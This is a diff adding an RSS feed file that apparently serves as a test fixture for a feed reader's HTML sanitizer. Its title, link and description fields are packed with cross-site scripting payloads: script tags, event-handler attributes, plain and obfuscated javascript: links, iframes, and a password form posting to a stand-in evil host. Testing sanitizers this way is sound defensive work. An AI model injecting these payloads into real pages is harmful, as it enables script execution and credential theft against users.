@@ -1,0 +1,20 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0"><channel>
+<title>Evil &lt;script&gt;alert(1)&lt;/script&gt; Feed</title>
+<link>https://xss.example/</link>
+<item>
+<title>&lt;img src=x onerror=alert(1)&gt;Hostile item</title>
+<link>javascript:alert(1)</link>
+<guid isPermaLink="false">xss-1</guid>
+<pubDate>Tue, 10 Jun 2025 09:00:00 GMT</pubDate>
+<description><![CDATA[<p onclick="alert(1)">Click me</p><script>alert('xss')</script><style>body{display:none}</style>
+<a href="javascript:alert(1)">bad link</a> <a href="JaVaScRiPt&#58;alert(1)">encoded bad link</a>
+<img src="https://xss.example/ok.png" onerror="alert(1)">
+<iframe src="https://evil.example/frame"></iframe>
+<iframe src="https://www.youtube.com/embed/abc123"></iframe>
+<svg onload="alert(1)"><circle r="1"/></svg>
+<form action="https://evil.example"><input name="password"></form>
+<object data="evil.swf"></object>
+<h2>Kept heading</h2><blockquote>Kept quote</blockquote><pre><code class="language-js">const a = 1;</code></pre>]]></description>
+</item>
+</channel></rss>
